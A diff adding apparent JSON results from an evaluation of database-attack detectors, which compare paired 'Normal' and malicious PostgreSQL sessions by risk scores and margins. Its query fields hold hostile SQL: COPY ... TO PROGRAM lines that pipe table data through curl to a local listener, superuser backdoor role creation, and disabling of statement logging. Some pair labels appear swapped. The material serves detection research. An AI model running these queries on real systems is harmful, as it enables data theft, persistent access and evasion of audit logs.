+          "margin_widened": -0.1977,
+          "os_discriminated": true,
+          "cross_discriminated": true
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "115448",
+            "filename": "enriched_session_115448_Normal.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5458,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111471",
+            "filename": "enriched_session_111471_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0032,
+          "margin_widened": 0.0032,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "116471",
+            "filename": "enriched_session_116471_Normal.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5469,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111479",
+            "filename": "enriched_session_111479_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0021,
+          "margin_widened": 0.0021,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "116529",
+            "filename": "enriched_session_116529_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111484",
+            "filename": "enriched_session_111484_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5471,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0019,
+          "margin_widened": -0.0019,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "116533",
+            "filename": "enriched_session_116533_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111495",
+            "filename": "enriched_session_111495_Data_Exfiltration.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "116539",
+            "filename": "enriched_session_116539_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "112405",
+            "filename": "enriched_session_112405_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "116540",
+            "filename": "enriched_session_116540_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.548,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113432",
+            "filename": "enriched_session_113432_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.001,
+          "margin_widened": 0.001,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "116549",
+            "filename": "enriched_session_116549_Normal.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113443",
+            "filename": "enriched_session_113443_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5464,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0026,
+          "margin_widened": -0.0026,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "117485",
+            "filename": "enriched_session_117485_Normal.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5469,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113500",
+            "filename": "enriched_session_113500_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0021,
+          "margin_widened": 0.0021,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "117554",
+            "filename": "enriched_session_117554_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113503",
+            "filename": "enriched_session_113503_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        }
+      ]
+    },
+    "DB_Privilege": {
+      "pair_count": 30,
+      "avg_os_cosine_similarity": 1.0,
+      "avg_file_jaccard_similarity": 0.9977,
+      "avg_os_margin": 0.0152,
+      "avg_cross_layer_margin": 0.3497,
+      "os_discrimination_accuracy": 0.0,
+      "cross_layer_discrimination_accuracy": 0.2,
+      "all_evaluations": [
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "100157",
+            "filename": "enriched_session_100157_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5647,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109463",
+            "filename": "enriched_session_109463_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5626,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0021,
+          "margin_widened": -0.0021,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "100555",
+            "filename": "enriched_session_100555_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.6291,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100702",
+            "filename": "enriched_session_100702_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5576,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0715,
+          "cross_margin": 0.549,
+          "margin_widened": 0.4775,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "100566",
+            "filename": "enriched_session_100566_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 3,
+            "file_count": 55,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "42650",
+            "filename": "enriched_session_42650_Attack.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 3,
+            "file_count": 55,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9298,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "109854",
+            "filename": "enriched_session_109854_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100704",
+            "filename": "enriched_session_100704_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5511,
+            "os_status": "benign",
+            "cross_risk": 0.7477,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0311,
+          "cross_margin": 0.7477,
+          "margin_widened": 0.7166,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "110864",
+            "filename": "enriched_session_110864_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5695,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100748",
+            "filename": "enriched_session_100748_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5608,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0087,
+          "cross_margin": 0.549,
+          "margin_widened": 0.5403,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "111878",
+            "filename": "enriched_session_111878_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5775,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110001",
+            "filename": "enriched_session_110001_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5695,
+            "os_status": "benign",
+            "cross_risk": 0.5495,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.008,
+          "cross_margin": 0.5495,
+          "margin_widened": 0.5415,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "112493",
+            "filename": "enriched_session_112493_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.6075,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110473",
+            "filename": "enriched_session_110473_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5488,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0587,
+          "margin_widened": -0.0587,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "112902",
+            "filename": "enriched_session_112902_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5775,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110003",
+            "filename": "enriched_session_110003_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.7492,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0047,
+          "cross_margin": 0.7492,
+          "margin_widened": 0.7445,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "113913",
+            "filename": "enriched_session_113913_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5535,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110047",
+            "filename": "enriched_session_110047_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.5517,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0287,
+          "cross_margin": 0.5517,
+          "margin_widened": 0.523,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "114526",
+            "filename": "enriched_session_114526_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5647,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111486",
+            "filename": "enriched_session_111486_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5647,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "114923",
+            "filename": "enriched_session_114923_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5497,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111015",
+            "filename": "enriched_session_111015_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.6291,
+            "os_status": "benign",
+            "cross_risk": 0.5552,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0794,
+          "cross_margin": 0.5552,
+          "margin_widened": 0.4758,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "115931",
+            "filename": "enriched_session_115931_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5507,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111017",
+            "filename": "enriched_session_111017_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.7492,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0315,
+          "cross_margin": 0.7492,
+          "margin_widened": 0.7177,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "116547",
+            "filename": "enriched_session_116547_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5626,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113518",
+            "filename": "enriched_session_113518_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5652,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0026,
+          "margin_widened": 0.0026,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "116952",
+            "filename": "enriched_session_116952_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5918,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111062",
+            "filename": "enriched_session_111062_SQL_Injection.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5775,
+            "os_status": "benign",
+            "cross_risk": 0.5504,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0143,
+          "cross_margin": 0.5504,
+          "margin_widened": 0.5361,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "117572",
+            "filename": "enriched_session_117572_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5745,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115540",
+            "filename": "enriched_session_115540_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
